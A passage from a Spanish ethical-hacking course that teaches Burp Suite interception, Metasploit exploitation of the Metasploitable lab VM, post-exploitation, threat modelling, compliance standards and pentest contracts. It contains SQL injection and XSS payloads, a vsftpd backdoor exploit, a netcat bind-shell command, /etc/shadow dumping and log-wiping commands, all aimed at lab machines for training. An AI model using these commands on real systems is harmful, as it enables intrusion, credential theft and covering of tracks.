Para interceptar el trÃ¡fico de una aplicaciÃ³n web (por ejemplo, desde el navegador), necesitas:

1. **Configurar el proxy de tu navegador** (normalmente a `127.0.0.1:8080`)
2. **Instalar el certificado de Burp Suite** en tu navegador (para HTTPS)
3. **Tener una web objetivo** (puede ser vulnerable como DVWA, Juice Shop, etc.)

---

### ğŸ§ª EJEMPLO COMPLETO DE USO DE BURP SUITE

#### ğŸ¯ Objetivo:

Vamos a interceptar y modificar el trÃ¡fico entre el navegador y un sitio web vulnerable llamado **DVWA** (Damn Vulnerable Web Application)

---

#### ğŸ”§ Paso 1: Instalar DVWA (opcional si ya tienes)

Usa XAMPP, Docker o Mutillidae. Supongamos que ya tienes DVWA en `http://localhost/dvwa`

---

#### ğŸš€ Paso 2: Iniciar Burp Suite

En Kali:

```bash
burpsuite
```

Selecciona **Community Edition**, crea un nuevo proyecto y dale "Start Burp".

---

#### ğŸŒ Paso 3: Configurar el proxy en Firefox o Chrome

- Abre tu navegador
- Ve a configuraciÃ³n de red
- Configura proxy manual:

  - **IP:** 127.0.0.1
  - **Puerto:** 8080

---

#### ğŸ” Paso 4: Instalar el certificado de Burp

1. En el navegador, ve a: `http://burp`
2. Haz clic en "CA Certificate"
3. DescÃ¡rgalo y agrÃ©galo como certificado de confianza

---

#### ğŸ” Paso 5: Activar â€œInterceptâ€ y visitar DVWA

- En Burp: ve a la pestaÃ±a **Proxy > Intercept**
- Activa â€œIntercept is onâ€
- Ve en el navegador a `http://localhost/dvwa/login.php`

ğŸ‘‰ Burp te mostrarÃ¡ la peticiÃ³n HTTP **interceptada**. Puedes:

- Ver el mÃ©todo (`POST`)
- Ver los parÃ¡metros enviados: `username=admin&password=123`
- Editar los valores antes de que lleguen al servidor

---

#### ğŸ› ï¸ Paso 6: Usar otras herramientas de Burp

##### ğŸ”¹ Repeater:

- Manda la peticiÃ³n interceptada a **Repeater**
- Modifica parÃ¡metros y ve cÃ³mo responde el servidor
- Ãštil para probar manualmente inyecciones: `admin' OR 1=1--`

##### ğŸ”¹ Intruder:

- Para realizar ataques automÃ¡ticos de fuerza bruta o fuzzing
- Ejemplo: probar mÃºltiples contraseÃ±as contra un login

##### ğŸ”¹ Decoder:

- Codifica/decodifica datos en base64, URL encoding, etc.

##### ğŸ”¹ Scanner (Solo versiÃ³n PRO):

- Realiza un escaneo automÃ¡tico de vulnerabilidades

---

### ğŸ§ª EJEMPLO PRÃCTICO: InyecciÃ³n simple de SQL

1. Captura el login en Burp Proxy
2. Manda la peticiÃ³n a Repeater
3. Cambia los valores:

```bash
username=admin' OR 1=1--&password=123
```

4. Haz clic en â€œSendâ€ y observa la respuesta

ğŸ‘‰ Si el sitio no estÃ¡ protegido, entrarÃ¡ sin necesidad de contraseÃ±a.

---

### ğŸ›¡ï¸ Â¿QuÃ© se puede probar con Burp Suite?

| Vulnerabilidad | Â¿CÃ³mo?                                 |
| -------------- | -------------------------------------- |
| XSS            | Inyectando `<script>alert(1)</script>` |
| SQLi           | Inyectando `' OR 1=1--`                |
| CSRF           | Observando formularios sin tokens      |
| IDOR           | Cambiando IDs de usuarios en URLs      |
| File Upload    | Subiendo archivos maliciosos           |

---

### âœ… Conclusiones

ğŸ”¹ **Burp Suite** es una navaja suiza para el pentester web
ğŸ”¹ Su punto fuerte es **interceptar y modificar trÃ¡fico HTTP**
ğŸ”¹ Puedes usarlo para encontrar vulnerabilidades manualmente
ğŸ”¹ Es compatible con otras herramientas como OWASP ZAP

---

[ğŸ”¼](#Ã­ndice)

---

## **877. PrÃ¡ctica: Explotando vulnerabilidades en metasploitable**

### ğŸ§  Â¿QuÃ© es Metasploitable?

**Metasploitable** es una mÃ¡quina virtual _intencionalmente vulnerable_, creada para practicar **hacking Ã©tico** y **pentesting**. Fue desarrollada por Rapid7 (creadores de Metasploit).

> Es como una "piÃ±ata de fallas de seguridad" para que puedas aprender sin hacer daÃ±o.

---

### âš™ï¸ Â¿QuÃ© necesitas para esta prÃ¡ctica?

- ğŸ± **Kali Linux** (herramienta de ataque)
- ğŸ’£ **Metasploitable 2 o 3** (objetivo vulnerable)
- ğŸ”Œ **VirtualBox o VMware** (para correr ambas VMs)
- ğŸŒ Ambas VMs deben estar en la **misma red** (modo "Red interna" o "Adaptador puente")

---

### ğŸ› ï¸ INSTALACIÃ“N DE METASPLOITABLE 2 (mÃ¡s simple)

#### âœ… 1. Descarga Metasploitable 2

ğŸ”— [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

1. Descarga el archivo `.zip`
2. Extrae el contenido
3. Abre el `.vmdk` con **VirtualBox** o **VMware**

---

#### âš™ï¸ 2. Configura la red en ambas mÃ¡quinas

En VirtualBox (para Kali y Metasploitable):

> **ConfiguraciÃ³n > Red > Adaptador 1 > Modo:** `Red interna` (o `Adaptador puente`)

Esto asegura que puedan verse entre ellas por IP.

---

#### ğŸŒ 3. ObtÃ©n las IPs

En **Kali**:

```bash
ip a
```

En **Metasploitable**:

```bash
ifconfig
```

Ejemplo:

- Kali: `192.168.56.101`
- Metasploitable: `192.168.56.102`

---

#### ğŸ” FASE 1: Escaneo con Nmap

Desde Kali, descubre servicios abiertos en Metasploitable:

```bash
nmap -sS -sV -O 192.168.56.102
```

Esto te dirÃ¡:

- QuÃ© puertos estÃ¡n abiertos
- QuÃ© servicios corren (FTP, SSH, Apache, MySQL, etc.)
- QuÃ© versiÃ³n de SO estÃ¡ usando

Ejemplo de salida:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1
23/tcp   open  telnet
80/tcp   open  http    Apache 2.2.8
```

---

#### âš”ï¸ FASE 2: Ataque con Metasploit

##### Paso 1: Inicia Metasploit

```bash
msfconsole
```

---

##### Paso 2: Buscar exploit para `vsftpd 2.3.4` (FTP con backdoor)

```bash
search vsftpd
```

VerÃ¡s algo como:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

##### Paso 3: Selecciona y configura el exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run
```

---

#### ğŸ”¥ Resultado esperado:

```bash
[*] Backdoor service has been spawned, handling...
[*] Command shell session 1 opened
```

Â¡Has conseguido una **shell remota** en la mÃ¡quina vÃ­ctima! ğŸ˜

---

### âœ… QuÃ© puedes hacer ahora

Dentro de la shell puedes ejecutar comandos como:

```bash
whoami
uname -a
ls /home
```

---

### ğŸ§ª OTROS SERVICIOS QUE PUEDES EXPLOTAR

| Servicio               | Vulnerabilidad       | Exploit                              |
| ---------------------- | -------------------- | ------------------------------------ |
| Telnet (`port 23`)     | SesiÃ³n sin login     | Manual                               |
| Samba (`port 139/445`) | Samba usermap script | `exploit/multi/samba/usermap_script` |
| Apache (`port 80`)     | WebDAV, PHP, etc.    | MÃºltiples                            |
| MySQL (`port 3306`)    | Default credentials  | Manual / Hydra                       |

---

### ğŸ§¼ Â¿CÃ³mo protegerse?

Metasploitable NO DEBE estar en una red real. Pero en sistemas reales, estas son buenas prÃ¡cticas:

âœ… Actualiza servicios desactualizados (como vsftpd 2.3.4)

âœ… Desactiva puertos innecesarios

âœ… Usa firewalls y autenticaciÃ³n fuerte

âœ… Haz escaneos periÃ³dicos con Nmap o Nessus

---

### ğŸ§  CONCLUSIONES

ğŸ”¹ Metasploitable es ideal para aprender explotaciÃ³n real

ğŸ”¹ Se combina perfectamente con Kali y Metasploit

ğŸ”¹ No necesitas daÃ±ar ningÃºn servidor para practicar

ğŸ”¹ Â¡La mejor forma de aprender es **romper cosas en laboratorio**!

---

[ğŸ”¼](#Ã­ndice)

---

## **878. Fase Post-ataque. MetodologÃ­as**

### ğŸ§  Â¿QuÃ© es la Fase Post-Ataque?

Es la etapa que **ocurre despuÃ©s de haber explotado una vulnerabilidad** y obtener acceso a una mÃ¡quina o red. En esta fase no se trata solo de entrar, sino de:

#### ğŸ¯ Objetivos clave:

- Mantener el acceso (persistencia)
- Escalar privilegios
- Movilidad lateral (acceder a otras mÃ¡quinas)
- Exfiltrar informaciÃ³n
- Cubrir huellas (limpiar logs)
- Documentar todo

> ğŸ“ Esta fase se parece mÃ¡s al trabajo de un espÃ­a digital que al de un hacker tradicional. No se rompe todo: **se analiza, se documenta y se asegura la permanencia para investigar mÃ¡s**.

---

### ğŸ§° Herramientas mÃ¡s usadas en post-explotaciÃ³n

| Herramienta   | Â¿Para quÃ© sirve?                              |
| ------------- | --------------------------------------------- |
| `Meterpreter` | Shell avanzada post-exploit de Metasploit     |
| `Mimikatz`    | Robar contraseÃ±as y hashes en Windows         |
| `Empire`      | Framework de post-exploitation en PowerShell  |
| `BloodHound`  | Analizar Active Directory                     |
| `Netcat`      | Crear backdoors y tunelizaciÃ³n                |
| `SSH/Plink`   | Mantener conexiÃ³n con la mÃ¡quina comprometida |

---

### ğŸ”§ Â¿CÃ³mo se instala el entorno?

Ya que estamos en la **fase post**, asumimos que ya tienes:

1. âœ… Una mÃ¡quina atacante (Kali Linux)
2. âœ… Una mÃ¡quina vÃ­ctima (Metasploitable o Windows vulnerable)
3. âœ… Acceso a la vÃ­ctima (por ejemplo, mediante Metasploit)

---

### ğŸ”Œ CONFIGURACIÃ“N BÃSICA DE PRUEBA

#### Paso 1: Iniciar Metasploit

```bash
msfconsole
```

#### Paso 2: Usar un exploit para conseguir acceso (como vsftpd)

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run
```

ğŸ¯ Una vez adentro, cambiarÃ¡s a **Meterpreter**, una shell con muchas herramientas post-exploit.

---

### ğŸ§ª EJEMPLO COMPLETO: POST-EXPLOITACIÃ“N CON METERPRETER

#### ğŸ“ Escenario:

Ya explotaste un servicio y tienes una sesiÃ³n de Meterpreter abierta.

---

#### âœ… 1. Enumerar informaciÃ³n del sistema

```bash
sysinfo
```

Salida:

```
Computer: metasploitable
OS: Linux 2.6.24
Arch: x86
```

---

#### âœ… 2. Obtener usuarios conectados

```bash
getuid
```

```bash
id
```

---

#### âœ… 3. Buscar archivos interesantes

```bash
search -f *.conf
```

O buscar contraseÃ±as directamente:

```bash
cat /etc/passwd
cat /etc/shadow
```

---

#### âœ… 4. Subir o descargar archivos

```bash
upload backdoor.sh /tmp
download /etc/passwd
```

---

#### âœ… 5. Mantener acceso: backdoor (Netcat)

En la vÃ­ctima:

```bash
nc -lvp 4444 -e /bin/bash
```

En Kali:

```bash
nc 192.168.56.102 4444
```

Esto crea una **shell inversa** manual.

---

#### âœ… 6. Escalar privilegios

Usa el mÃ³dulo de `local_exploit_suggester` de Metasploit:

```bash
run post/multi/recon/local_exploit_suggester
```

Te recomendarÃ¡ exploits para elevar de usuario normal a root.

---

### ğŸ“˜ METODOLOGÃAS EN POST-EXPLOITACIÃ“N

Las siguientes metodologÃ­as guÃ­an el trabajo profesional del pentester tras el acceso:

| MetodologÃ­a             | Objetivo principal                                                    |
| ----------------------- | --------------------------------------------------------------------- |
| **PTES**                | Estandarizar post-exploit en pentesting                               |
| **MITRE ATT\&CK**       | TÃ¡cticas y tÃ©cnicas reales de APTs (persistencia, exfiltraciÃ³n, etc.) |
| **OWASP Testing Guide** | Enfocado en aplicaciones web, incluye acciones post                   |

#### Ejemplo con MITRE ATT\&CK:

- **TA0003 â€“ Persistencia:** AÃ±adir un servicio al inicio en Linux.
- **TA0005 â€“ Defensa evasiva:** Borrar logs (`rm -f /var/log/auth.log`)
- **TA0006 â€“ Credenciales:** Dump de `/etc/shadow` o `mimikatz` en Windows.
- **TA0007 â€“ Descubrimiento:** Enumerar interfaces, usuarios, etc.
- **TA0008 â€“ Movimiento lateral:** Con SSH, RDP, etc.

---

#### ğŸ§¼ 7. Cubrir huellas (Â¡sÃ³lo en laboratorio!)

```bash
rm -f /var/log/auth.log
history -c
```

> âš ï¸ Â¡Nunca lo hagas fuera de un entorno controlado o sin permiso legal!

---

### âœ… RESUMEN DE PASOS (checklist)

âœ… Acceso inicial a la mÃ¡quina

âœ… EnumeraciÃ³n de usuarios, sistema y redes

âœ… ExtracciÃ³n de credenciales o archivos sensibles

âœ… Escalado de privilegios

âœ… Persistencia (backdoor o cronjob)

âœ… Movimiento lateral (si hay mÃ¡s mÃ¡quinas)

âœ… Documentar todo para el informe final

---

### ğŸ” Â¿CÃ³mo prevenir la post-explotaciÃ³n?

- Uso de firewalls y antivirus
- No usar contraseÃ±as por defecto
- Monitorear actividad de red y sistema
- Actualizar software
- DetecciÃ³n de anomalÃ­as (SIEM)

---

### ğŸ“Œ CONCLUSIÃ“N

ğŸ”¹ Esta fase es donde el **hacking Ã©tico se vuelve mÃ¡s estratÃ©gico**
ğŸ”¹ El pentester ya no solo ataca, ahora **analiza, permanece y se mueve**
ğŸ”¹ Las herramientas como `Meterpreter`, `Mimikatz` y `Empire` son clave
ğŸ”¹ Se usan marcos profesionales como **MITRE ATT\&CK** y **PTES**

---

[ğŸ”¼](#Ã­ndice)

---

## **879. GestiÃ³n de riesgos y modelado de amenazas**

### ğŸ§  Â¿QuÃ© es la GestiÃ³n de Riesgos?

Es el proceso de identificar, analizar y **mitigar los riesgos** que amenazan la seguridad de los activos (datos, redes, software, etc.) de una organizaciÃ³n.

#### ğŸ§© Â¿QuÃ© es un Riesgo?

Un riesgo en ciberseguridad es la **combinaciÃ³n de una vulnerabilidad explotable y una amenaza real** que puede causar daÃ±o.

> ğŸ”’ **Riesgo = Vulnerabilidad + Amenaza + Impacto**

---

### ğŸ” Â¿QuÃ© es el Modelado de Amenazas?

Es una **tÃ©cnica de anÃ¡lisis proactivo** para encontrar posibles amenazas **antes de que un atacante lo haga**. Sirve para responder preguntas como:

- Â¿QuÃ© podrÃ­a salir mal?
- Â¿QuÃ© atacantes pueden estar interesados?
- Â¿QuÃ© controles debo aplicar?

---

### ğŸ“‹ Etapas de la GestiÃ³n de Riesgos

| Etapa                 | DescripciÃ³n                                      |
| --------------------- | ------------------------------------------------ |
| **1. IdentificaciÃ³n** | Identificar activos, amenazas y vulnerabilidades |
| **2. EvaluaciÃ³n**     | Evaluar impacto y probabilidad                   |
| **3. Tratamiento**    | Decidir: Mitigar, Transferir, Aceptar o Evitar   |
| **4. Monitoreo**      | RevisiÃ³n y mejora continua                       |

---

### âš ï¸ Ejemplo Simple de Riesgo

| Elemento       | Valor                                   |
| -------------- | --------------------------------------- |
| Activo         | Base de datos de clientes               |
| Vulnerabilidad | ContraseÃ±a dÃ©bil en MySQL               |
| Amenaza        | Ataque de fuerza bruta                  |
| Impacto        | PÃ©rdida de datos + multa por privacidad |
| Riesgo         | Alto                                    |

---

### ğŸ§  MÃ©todos para el Modelado de Amenazas

#### 1. **STRIDE** (modelo de Microsoft)

| Letra | Amenaza                    | Ejemplo                              |
| ----- | -------------------------- | ------------------------------------ |
| S     | **Spoofing**               | SuplantaciÃ³n de identidad            |
| T     | **Tampering**              | ModificaciÃ³n de datos                |
| R     | **Repudiation**            | NegaciÃ³n de acciones                 |
| I     | **Information Disclosure** | Fuga de datos sensibles              |
| D     | **Denial of Service**      | CaÃ­da del sistema                    |
| E     | **Elevation of Privilege** | Subir de usuario normal a root/admin |

---

#### 2. **DREAD** (mÃ©todo para priorizar riesgos)

| Factor          | DescripciÃ³n                                    |
| --------------- | ---------------------------------------------- |
| Damage          | Â¿QuÃ© tanto daÃ±o puede causar?                  |
| Reproducibility | Â¿QuÃ© tan fÃ¡cil es repetir el ataque?           |
| Exploitability  | Â¿QuÃ© tan fÃ¡cil es explotar la amenaza?         |
| Affected Users  | Â¿A cuÃ¡ntos usuarios afecta?                    |
| Discoverability | Â¿QuÃ© tan fÃ¡cil es encontrar la vulnerabilidad? |

Cada factor se puntÃºa de 1 a 10, se suman y se prioriza el riesgo.

---

### ğŸ§° Herramientas de Modelado de Amenazas

#### âœ… 1. **Microsoft Threat Modeling Tool** (Gratis)

- AplicaciÃ³n para modelar amenazas usando STRIDE
- Genera automÃ¡ticamente amenazas segÃºn tu arquitectura

ğŸ”— [Descarga](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling)

---

#### âœ… 2. **OWASP Threat Dragon**

- Herramienta open source multiplataforma
- Puedes usarla online o instalarla

ğŸ”— [Sitio oficial](https://owasp.org/www-project-threat-dragon/)

---

### ğŸ–¥ï¸ InstalaciÃ³n rÃ¡pida de OWASP Threat Dragon (modo local)

#### Requisitos:

- Node.js instalado

```bash
npm install -g @owasp/threat-dragon
threatdragon
```

Abre en tu navegador:
ğŸ‘‰ `http://localhost:8080`

---

### âœ… EJEMPLO COMPLETO

#### ğŸ§ª Escenario: AplicaciÃ³n web de e-commerce

Tu aplicaciÃ³n tiene:

- Inicio de sesiÃ³n
- PÃ¡gina de productos
- Carrito de compras
- Pago con tarjeta

#### âš™ï¸ Paso 1: Crear modelo en Threat Dragon o papel

Dibuja los siguientes elementos:

- Usuario
- Navegador
- Servidor Web
- Base de datos
- Servicio de pagos externo

#### âš ï¸ Paso 2: Identificar amenazas con STRIDE

| Componente       | Amenaza                    | Tipo (STRIDE)          |
| ---------------- | -------------------------- | ---------------------- |
| Inicio de sesiÃ³n | SuplantaciÃ³n (login falso) | Spoofing               |
| Carrito          | ModificaciÃ³n de precios    | Tampering              |
| TransacciÃ³n      | Fuga de tarjeta            | Information Disclosure |
| Web App          | DDoS                       | Denial of Service      |
| DB               | InyecciÃ³n SQL              | Elevation of Privilege |

---

#### ğŸ“Š Paso 3: Calificar con DREAD

| Amenaza                 | DREAD Score                 |
| ----------------------- | --------------------------- |
| InyecciÃ³n SQL           | 9 + 9 + 10 + 9 + 8 = **45** |
| ModificaciÃ³n de precios | 6 + 7 + 8 + 6 + 5 = **32**  |
| SuplantaciÃ³n de login   | 5 + 6 + 5 + 6 + 4 = **26**  |

ğŸ”´ **Prioridad alta:** InyecciÃ³n SQL

ğŸŸ¡ **Prioridad media:** ManipulaciÃ³n de precios

ğŸŸ¢ **Prioridad baja:** Spoofing de login

---

#### ğŸ›¡ï¸ Paso 4: Tomar decisiones

- Aplicar **validaciÃ³n de entradas** para evitar SQLi
- Usar HTTPS en toda la app
- Limitar intentos de login
- Activar monitoreo con SIEM o alertas

---

### ğŸ§¾ CONCLUSIÃ“N

- **La gestiÃ³n de riesgos** ayuda a entender quÃ© proteger y cÃ³mo.
- **El modelado de amenazas** es una tÃ©cnica para identificar problemas antes de que ocurra un ataque.
- STRIDE y DREAD son mÃ©todos simples pero poderosos.
- Herramientas como **Threat Modeling Tool** o **Threat Dragon** facilitan mucho el trabajo.
- La gestiÃ³n y modelado **no es solo para expertos**, sino para **todo desarrollador o pentester profesional**.

---

[ğŸ”¼](#Ã­ndice)

---

## **880. PCI DSS. HIPAA. DMCA.ISO/IEC 27001**

### ğŸ“¦ 1. Â¿QuÃ© es PCI DSS?

#### ğŸ” Significa: _Payment Card Industry Data Security Standard_

Es un **estÃ¡ndar de seguridad obligatorio** para toda empresa que **almacene, procese o transmita datos de tarjetas de crÃ©dito**.

#### âœ… Objetivo:

Proteger los datos de tarjetas de dÃ©bito/crÃ©dito y evitar fraudes.

#### ğŸ“‹ Requisitos clave (ejemplos):

| Requisito                    | Ejemplo PrÃ¡ctico                            |
| ---------------------------- | ------------------------------------------- |
| Usar firewall                | Instalar `iptables` o `ufw`                 |
| Cifrar transmisiÃ³n de datos  | Forzar HTTPS                                |
| Usar contraseÃ±as seguras     | Bloquear accesos con autenticaciÃ³n fuerte   |
| Monitorear accesos y alertas | Usar herramientas como **Snort** o **SIEM** |

---

### ğŸ§¬ 2. Â¿QuÃ© es HIPAA?

#### ğŸ‘©â€âš•ï¸ Significa: _Health Insurance Portability and Accountability Act_ (EE.UU.)

Es una ley que protege la **informaciÃ³n mÃ©dica personal (PHI)**.

#### âœ… Objetivo:

Evitar que informaciÃ³n mÃ©dica (exÃ¡menes, diagnÃ³sticos, tratamientos) se exponga o se use indebidamente.

#### ğŸ“‹ Ejemplos:

| AcciÃ³n Permitida por HIPAA            | AcciÃ³n Prohibida                            |
| ------------------------------------- | ------------------------------------------- |
| Acceder al historial con autorizaciÃ³n | Compartir historial sin permiso             |
| Usar cifrado para enviar exÃ¡menes     | Enviar resultados mÃ©dicos por correo simple |

#### ğŸ›  Herramientas Ãºtiles:

- Cifrado de discos (como **VeraCrypt**)
- VPN y tÃºneles seguros
- Control de acceso con **LDAP** o **Active Directory**

---

### ğŸ“„ 3. Â¿QuÃ© es DMCA?

#### ğŸ“š Significa: _Digital Millennium Copyright Act_

Es una ley de derechos de autor de EE.UU. aplicada en entornos digitales.

#### âœ… Objetivo:

Proteger **contenidos digitales con derechos de autor**, incluyendo software, libros, mÃºsica, imÃ¡genes.

#### ğŸ“‹ Ejemplos comunes:

| Permitido (Fair Use)                        | Prohibido (ViolaciÃ³n de DMCA)     |
| ------------------------------------------- | --------------------------------- |
| Usar fragmentos breves con fines educativos | Subir software crackeado a GitHub |
| Parodiar un video con derechos              | Descargar mÃºsica sin licencia     |

> ğŸ’¡ GitHub, YouTube y Google **bloquean contenido** por infracciÃ³n DMCA.

---

### ğŸŒ 4. Â¿QuÃ© es ISO/IEC 27001?

#### ğŸ›¡ï¸ Es un estÃ¡ndar internacional de **gestiÃ³n de seguridad de la informaciÃ³n** (ISMS).

#### âœ… Objetivo:

Establecer procesos, controles y auditorÃ­as para proteger la **confidencialidad, integridad y disponibilidad** de la informaciÃ³n.

#### ğŸ§© Clave del estÃ¡ndar:

No solo es tÃ©cnico, tambiÃ©n es organizacional.

#### ğŸ“‹ Ejemplos:

| Requisito de ISO 27001              | Ejemplo                                    |
| ----------------------------------- | ------------------------------------------ |
| Control de acceso                   | Cada empleado tiene usuario y clave Ãºnicos |
| Respaldo de informaciÃ³n             | Backups diarios automÃ¡ticos                |
| PolÃ­ticas de seguridad documentadas | Manual de polÃ­ticas de seguridad digital   |

---

### ğŸ–¥ï¸ Â¿CÃ³mo se â€œinstalaâ€ o aplica cada uno?

Estas normas **no se instalan como software**, pero se pueden implementar usando herramientas y prÃ¡cticas especÃ­ficas. AquÃ­ te doy una idea para cada una:

#### ğŸ”§ PCI DSS

- Instala un firewall (`ufw` en Linux):

```bash
sudo apt install ufw
sudo ufw enable
sudo ufw allow 443/tcp
```

- Fuerza HTTPS con **Let's Encrypt** y Nginx

#### ğŸ”§ HIPAA

- Usa cifrado de disco con **VeraCrypt** o **BitLocker**
- Usa autenticaciÃ³n con doble factor

#### ğŸ”§ ISO/IEC 27001

- Crea una **polÃ­tica de seguridad**
- Usa **Open-AudIT** o **GLPI** para inventario de activos
- Herramientas SIEM como Wazuh, Splunk o ELK para monitoreo

#### ğŸ”§ DMCA

- Verifica cÃ³digo o contenido antes de publicarlo
- Si usas contenido de terceros, ten **licencias** o usa contenido libre como en [creativecommons.org](https://creativecommons.org)

---

### âœ… EJEMPLO COMPLETO: AplicaciÃ³n web que cumple PCI DSS e ISO/IEC 27001

#### Escenario:

EstÃ¡s desarrollando una tienda online que acepta pagos con tarjeta.

#### Paso 1: Cumplimiento de PCI DSS

| AcciÃ³n                     | EjecuciÃ³n prÃ¡ctica                         |
| -------------------------- | ------------------------------------------ |
| Usar HTTPS                 | Certificado con Letâ€™s Encrypt y Nginx      |
| No guardar tarjetas        | Usar Stripe o PayPal como pasarela externa |
| Cifrado de datos sensibles | Usar `bcrypt` para contraseÃ±as             |
| Monitorear trÃ¡fico         | Instalar **Snort** para IDS                |

#### Paso 2: Cumplimiento ISO/IEC 27001

| AcciÃ³n                | EjecuciÃ³n prÃ¡ctica                         |
| --------------------- | ------------------------------------------ |
| Control de acceso     | Roles definidos: admin, usuario, visitante |
| GestiÃ³n de incidentes | Logs centralizados con Wazuh o SIEM        |
| Respaldos             | Automatizados con cron y `rsync`           |
| DocumentaciÃ³n         | Manual de polÃ­ticas (PDF, wiki, etc.)      |

---

### ğŸ§  CONCLUSIÃ“N

| Norma         | Enfocada en...                        | Principal uso                        |
| ------------- | ------------------------------------- | ------------------------------------ |
| **PCI DSS**   | Tarjetas de crÃ©dito                   | E-commerce, bancos, sistemas de pago |
| **HIPAA**     | InformaciÃ³n mÃ©dica                    | ClÃ­nicas, hospitales, apps mÃ©dicas   |
| **DMCA**      | Derechos de autor en medios digitales | Plataformas online, GitHub, YouTube  |
| **ISO 27001** | Seguridad general de la informaciÃ³n   | Empresas que manejan datos sensibles |

---

[ğŸ”¼](#Ã­ndice)

---

## **881. Contratos, Reglas de compromisos, ClÃ¡usula de no competencia y Acuerdo de confidencialidad**

### ğŸ§¾ 1. CONTRATOS EN HACKING Ã‰TICO

#### ğŸ” Â¿QuÃ© es?

Un **contrato** es un documento legal firmado entre el **hacker Ã©tico (pentester)** y la **empresa o cliente** que solicita el servicio. Establece claramente **lo que se va a hacer**, **cuÃ¡ndo**, **cÃ³mo**, y **con quÃ© limitaciones**.

#### ğŸ§  Â¿Por quÃ© es importante?

Sin un contrato, realizar un test de penetraciÃ³n (pentest) puede considerarse **ilegal**. El contrato **protege legalmente** a ambas partes.

#### ğŸ“‹ QuÃ© debe incluir:

- IdentificaciÃ³n de las partes
- Tipo de pruebas autorizadas (red, web, Wi-Fi, etc.)
- DuraciÃ³n del trabajo
- Honorarios
- Responsabilidades
- ClÃ¡usulas legales (confidencialidad, competencia, etc.)

#### ğŸ§  Ejemplo sencillo:

> â€œEl pentester podrÃ¡ ejecutar pruebas de intrusiÃ³n en la web `tiendaonline.com` entre el 1 y el 5 de agosto, sin afectar a clientes reales, y usando herramientas aprobadas como Nmap y Burp Suite.â€

---

### âš”ï¸ 2. REGLAS DE COMPROMISO (ROE â€“ Rules of Engagement)

#### ğŸ” Â¿QuÃ© es?

Es un **anexo tÃ©cnico al contrato**. Define los **lÃ­mites, alcance y mÃ©todos** que el hacker Ã©tico puede usar durante el pentest.

#### ğŸ“‹ Contiene:

- Â¿QuÃ© sistemas se pueden atacar?
- Â¿CuÃ¡ndo se pueden hacer las pruebas?
- Â¿QuÃ© tÃ©cnicas estÃ¡n permitidas?
- Â¿QuÃ© hacer si se encuentra informaciÃ³n sensible?
- Â¿QuÃ© hacer en caso de caÃ­da del sistema?

#### ğŸ§  Ejemplo:

> â€œEl pentester no podrÃ¡ realizar ataques de denegaciÃ³n de servicio (DoS). El escaneo se harÃ¡ solo entre las 2:00 am y las 4:00 am. Si encuentra credenciales de usuarios reales, deberÃ¡ reportarlas inmediatamente y no usarlas.â€

---

### ğŸš« 3. CLÃUSULA DE NO COMPETENCIA

#### ğŸ” Â¿QuÃ© es?

Es una clÃ¡usula que prohÃ­be al hacker Ã©tico **trabajar con empresas rivales del cliente** durante o despuÃ©s del contrato, por un tiempo limitado.

#### ğŸ“‹ Â¿Por quÃ© se usa?

Para evitar que un hacker Ã©tico use conocimientos adquiridos con un cliente para beneficiar a su competencia.

#### ğŸ§  Ejemplo simple:

> â€œEl consultor no podrÃ¡ prestar servicios de seguridad a empresas competidoras de ClienteX durante un perÃ­odo de 12 meses despuÃ©s de finalizado el contrato.â€

---

### ğŸ¤ 4. ACUERDO DE CONFIDENCIALIDAD (NDA â€“ Non-Disclosure Agreement)

#### ğŸ” Â¿QuÃ© es?

Es un documento que impide al hacker Ã©tico revelar informaciÃ³n confidencial del cliente, como:

- Sistemas internos
- Vulnerabilidades encontradas
- Datos de clientes o empleados
- Planes o estrategias de seguridad

### ğŸ§  Ejemplo:

> â€œEl firmante se compromete a no divulgar, publicar ni utilizar para fines personales ninguna informaciÃ³n tÃ©cnica, estratÃ©gica ni comercial obtenida durante el contrato.â€

> ğŸ” Â¡Un NDA protege legalmente la **privacidad de la empresa** y la **integridad del pentester**!

---

### ğŸ“¥ Â¿CÃ“MO SE "INSTALA" ESTO?

No se â€œinstalaâ€ como software, pero sÃ­ se **implementa como parte del proceso profesional**:

#### Paso a paso para implementar correctamente:

1. **Plantillas**: Crea o descarga plantillas de contrato, NDA y clÃ¡usulas.
2. **AdaptaciÃ³n**: PersonalÃ­zalas para cada cliente (nombre, fechas, alcance).
3. **Firma**: Usa firma digital con herramientas como:

   - [DocuSign](https://www.docusign.com/)
   - [Adobe Sign](https://acrobat.adobe.com/us/en/sign.html)
   - PDF con firma manuscrita escaneada

4. **Archivo seguro**: Guarda los documentos en sistemas cifrados o controlados.

---

### âœ… EJEMPLO COMPLETO

SupÃ³n que **Gustavo** es un pentester freelance. Lo contrata la empresa **CyberMarket S.A.C.**, para hacer una evaluaciÃ³n de seguridad en su plataforma e-commerce.

#### ğŸ” Documentos firmados:

##### 1. Contrato:

- Pruebas autorizadas en `https://www.cybermarket.com`
- DuraciÃ³n: del 1 al 7 de agosto
- Herramientas: Burp Suite, Nmap, Nikto
- Precio: S/. 1500 por el servicio
- Entrega de reporte tÃ©cnico y ejecutivo

##### 2. Reglas de compromiso (ROE):

- No se permiten ataques DoS o DDoS
- Escaneo solo entre 12:00 a.m. y 4:00 a.m.
- Se debe avisar si se encuentran datos sensibles

##### 3. ClÃ¡usula de no competencia:

- Gustavo no puede trabajar con **TiendaZ**, competencia directa, por 1 aÃ±o

##### 4. NDA:

- Gustavo no podrÃ¡ divulgar ninguna informaciÃ³n tÃ©cnica ni comercial encontrada, ni en redes ni en su portafolio

---

### ğŸ¯ CONCLUSIÃ“N RÃPIDA

| Elemento                | Â¿Para quÃ© sirve?               | Â¿CÃ³mo lo implemento?                         |
| ----------------------- | ------------------------------ | -------------------------------------------- |
| **Contrato**            | Legalizar el trabajo           | Firma fÃ­sica o digital                       |
| **Rules of Engagement** | Limitar el alcance del pentest | Documento tÃ©cnico anexo al contrato          |
| **No competencia**      | Evitar conflicto de intereses  | ClÃ¡usula en el contrato                      |
| **NDA**                 | Mantener la confidencialidad   | Documento por separado o dentro del contrato |

---

[ğŸ”¼](#Ã­ndice)

---

